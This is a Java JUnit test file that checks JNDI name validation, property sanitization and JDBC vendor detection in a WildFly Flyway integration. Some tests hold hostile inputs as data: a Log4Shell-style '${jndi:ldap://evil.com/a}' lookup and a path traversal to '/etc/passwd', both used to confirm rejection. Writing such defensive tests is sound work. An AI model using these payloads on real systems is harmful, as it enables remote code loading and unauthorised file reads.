package com.github.wildfly.flyway.config;

import org.junit.Test;

import static org.junit.Assert.*;

/**
 * Tests the security validation and sanitization logic exposed by
 * FlywayConfigurationBuilder (JNDI validation, value sanitization).
 *
 * Also validates that SpringBootPropertyResolver.detectVendor handles
 * legitimate JDBC URLs without false positives.
 */
public class SecurityPatternTest {

    // --- JNDI validation (FlywayConfigurationBuilder.validateJndiName) ---

    @Test
    public void testValidJndiNames() {
        // Standard WildFly datasource JNDI names
        FlywayConfigurationBuilder.validateJndiName("java:jboss/datasources/MyDS");
        FlywayConfigurationBuilder.validateJndiName("java:jboss/datasources/ExampleDS");
        FlywayConfigurationBuilder.validateJndiName("java:/MyDS");
        FlywayConfigurationBuilder.validateJndiName("java:comp/env/jdbc/MyDS");
    }

    @Test(expected = IllegalArgumentException.class)
    public void testJndiInjectionRejected() {
        FlywayConfigurationBuilder.validateJndiName("${jndi:ldap://evil.com/a}");
    }

    @Test(expected = IllegalArgumentException.class)
    public void testPathTraversalInJndiRejected() {
        FlywayConfigurationBuilder.validateJndiName("java:jboss/datasources/../../etc/passwd");
    }

    @Test(expected = IllegalArgumentException.class)
    public void testEmptyJndiRejected() {
        FlywayConfigurationBuilder.validateJndiName("");
    }

    @Test(expected = IllegalArgumentException.class)
    public void testNullJndiRejected() {
        FlywayConfigurationBuilder.validateJndiName(null);
    }

    @Test(expected = IllegalArgumentException.class)
    public void testInvalidPrefixRejected() {
        FlywayConfigurationBuilder.validateJndiName("ldap://evil.com/a");
    }

    // --- Value sanitization (FlywayConfigurationBuilder.sanitizePropertyValue) ---

    @Test
    public void testSanitizeRemovesJndiInjection() {
        String result = FlywayConfigurationBuilder.sanitizePropertyValue("${jndi:ldap://evil.com}");
        assertFalse("JNDI injection pattern should be removed",
                result.contains("${jndi:"));
    }

    @Test
    public void testSanitizePreservesNormalValues() {
        assertEquals("classpath:db/migration",
                FlywayConfigurationBuilder.sanitizePropertyValue("classpath:db/migration"));
        assertEquals("java:jboss/datasources/MyDS",
                FlywayConfigurationBuilder.sanitizePropertyValue("java:jboss/datasources/MyDS"));
    }

    @Test
    public void testSanitizeNull() {
        assertNull(FlywayConfigurationBuilder.sanitizePropertyValue(null));
    }

    // --- Vendor detection (SpringBootPropertyResolver.detectVendor) ---

    @Test
    public void testLegitimateJdbcUrlsDetectVendor() {
        assertEquals("sqlserver", SpringBootPropertyResolver.detectVendor("jdbc:sqlserver://host;instance=MSSQL"));
        assertEquals("h2", SpringBootPropertyResolver.detectVendor("jdbc:h2:mem:test;DB_CLOSE_DELAY=-1"));
        assertEquals("oracle", SpringBootPropertyResolver.detectVendor("jdbc:oracle:thin:@host:1521:orcl"));
        assertEquals("postgresql", SpringBootPropertyResolver.detectVendor("jdbc:postgresql://localhost/db"));
        assertEquals("mysql", SpringBootPropertyResolver.detectVendor("jdbc:mysql://localhost/db"));
        assertEquals("mariadb", SpringBootPropertyResolver.detectVendor("jdbc:mariadb://localhost/db"));
        assertEquals("db2", SpringBootPropertyResolver.detectVendor("jdbc:db2://localhost:50000/sample"));
    }

    @Test
    public void testNullAndUnknownUrl() {
        assertNull(SpringBootPropertyResolver.detectVendor(null));
        assertNull(SpringBootPropertyResolver.detectVendor(""));
        assertNull(SpringBootPropertyResolver.detectVendor("jdbc:unknown://localhost/db"));
    }
}
